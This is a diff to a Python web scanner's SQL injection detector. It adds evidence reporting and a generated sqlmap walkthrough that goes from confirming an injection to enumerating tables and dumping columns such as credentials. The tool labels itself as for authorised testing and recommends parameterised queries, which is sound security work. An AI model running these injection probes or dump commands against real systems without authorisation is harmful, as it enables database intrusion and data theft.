@@ -23,6 +23,7 @@ import httpx
 from loguru import logger
 
 from config import SAFE_MODE_RATE_DELAY
+from scanner import evidence as ev
 from scanner.engine import Finding, Severity, ScanEngine
 
 MODULE = "sqli_detect"
@@ -112,25 +113,55 @@ def _timed_get(engine: ScanEngine, url: str) -> float | None:
 _SQLMAP_TECH = {"error-based": "E", "boolean-based blind": "B", "time-based blind": "T"}
 
 
-def _finding(url: str, param: str, technique: str, payload: str, db: str) -> Finding:
+def _evidence(param: str, payload: str, resp: "httpx.Response | None" = None,
+              indicator: str = "") -> list[str]:
+    """Proof lines for a SQLi finding: the injection point + the response/signal that confirmed it."""
+    lines = [f"injected into URL parameter '{param}': {ev.note(payload)[:80]}"]
+    if resp is not None:
+        lines += ev.from_response(resp, indicator=indicator)
+    elif indicator:
+        lines.append(f"matched: {ev.note(indicator)}")
+    return lines
+
+
+def _exploitation_steps(url: str, param: str, flag: str) -> list[dict]:
+    """The ordered sqlmap kill chain that weaponises a confirmed injection — from confirmation down to
+    data exfiltration. The <database>/<table>/<columns> placeholders are filled in at runtime as each
+    stage discovers names. Authorised targets only."""
+    base = f'sqlmap -u "{url}" -p {param} --batch --technique={flag}'
+    return [
+        {"step": 1, "description": "Confirm the injection, fingerprint the DBMS, and list the databases.",
+         "command": f"{base} --threads=10 --dbs"},
+        {"step": 2, "description": "Enumerate the tables inside the target database.",
+         "command": f"{base} -D <database> --tables"},
+        {"step": 3, "description": "List the columns of the target table to locate the sensitive fields.",
+         "command": f"{base} -D <database> -T <table> --columns"},
+        {"step": 4, "description": "Dump the chosen columns to extract the data (e.g. credentials).",
+         "command": f"{base} -D <database> -T <table> -C <columns> --dump"},
+    ]
+
+
+def _finding(url: str, param: str, technique: str, payload: str, db: str,
+             evidence: list[str] | None = None) -> Finding:
     proof_url = _inject(url, param, payload)
     flag = _SQLMAP_TECH.get(technique, "BEUSTQ")
     sqlmap_args = ["-u", url, "-p", param, "--batch", f"--technique={flag}", "--threads=10", "--dbs"]
     sqlmap = f'sqlmap -u "{url}" -p {param} --batch --technique={flag} --threads=10 --dbs'
+    steps = _exploitation_steps(url, param, flag)
     return Finding(
         module=MODULE,
         title=f"SQL Injection ({technique}): {param}" + (f" ({db})" if db else ""),
         description=(f"Parameter '{param}' in {url} is vulnerable to SQL injection via {technique} "
                      f"detection. Payload: {payload!r}." + (f" DBMS: {db}." if db else "")
-                     + f"\n\nExploit / extract data with sqlmap (authorised targets only):\n  {sqlmap}\n"
-                     "Then add  --dump -D <database> -T <table>  to pull specific data. The clickable "
-                     "proof link replays the injected request in your browser."),
+                     + " An sqlmap exploitation walkthrough (authorised targets only) is attached below; "
+                     "the clickable proof link replays the injected request in your browser."),
         severity=Severity.CRITICAL,
         recommendation=("Use parameterised queries / prepared statements everywhere; never concatenate "
                         "user input into SQL. Validate types and apply least-privilege DB accounts."),
         raw={"url": url, "parameter": param, "technique": technique, "payload": payload,
              "database": db, "proof_url": proof_url, "sqlmap": sqlmap,
-             "sqlmap_args": sqlmap_args, "confidence": "high"},
+             "sqlmap_args": sqlmap_args, "confidence": "high",
+             "evidence": evidence or _evidence(param, payload), "exploitation": steps},
     )
 
 
@@ -151,7 +182,9 @@ def _test_param(engine: ScanEngine, url: str, param: str, allow_time: bool) -> F
         for _name, payload in _ERROR_PAYLOADS:
             resp = _get(engine, _inject(url, param, payload))
             if resp and (db := _detect_error(resp.text)):
-                return _finding(url, param, "error-based", payload, db)
+                return _finding(url, param, "error-based", payload, db,
+                                _evidence(param, payload, resp,
+                                          f"{db} SQL error signature appeared (absent in baseline)"))
 
     # 2. Boolean-based blind
     if base is not None:
@@ -161,8 +194,11 @@ def _test_param(engine: ScanEngine, url: str, param: str, allow_time: bool) -> F
             if rt is not None and rf is not None:
                 if _similar(rt.text, base.text) and not _similar(rf.text, base.text) \
                         and not _similar(rt.text, rf.text):
-                    return _finding(url, param, "boolean-based blind",
-                                    true_t.format(v=orig), "")
+                    return _finding(
+                        url, param, "boolean-based blind", true_t.format(v=orig), "",
+                        _evidence(param, true_t.format(v=orig), rt,
+                                  f"TRUE≈baseline ({len(rt.text)}B≈{len(base.text)}B) while "
+                                  f"FALSE differs ({len(rf.text)}B) — blind boolean split"))
 
     # 3. Time-based blind
     if allow_time:
@@ -175,7 +211,12 @@ def _test_param(engine: ScanEngine, url: str, param: str, allow_time: bool) -> F
                 # Confirm the delay scales with the requested sleep (rules out a slow endpoint).
                 short_t = _timed_get(engine, _inject(url, param, tmpl.format(v=orig, t=_TIME_SHORT)))
                 if short_t is not None and (long_t - short_t) >= (_TIME_LONG - _TIME_SHORT) - 1.5:
-                    return _finding(url, param, "time-based blind", tmpl.format(v=orig, t=_TIME_LONG), db)
+                    long_payload = tmpl.format(v=orig, t=_TIME_LONG)
+                    return _finding(
+                        url, param, "time-based blind", long_payload, db,
+                        [f"injected into URL parameter '{param}': {ev.note(long_payload)[:80]}",
+                         f"matched: {db} delay scales with sleep — {long_t:.1f}s (SLEEP {_TIME_LONG}) "
+                         f"vs {short_t:.1f}s (SLEEP {_TIME_SHORT}) vs {baseline_t:.1f}s baseline"])
     return None
 
 
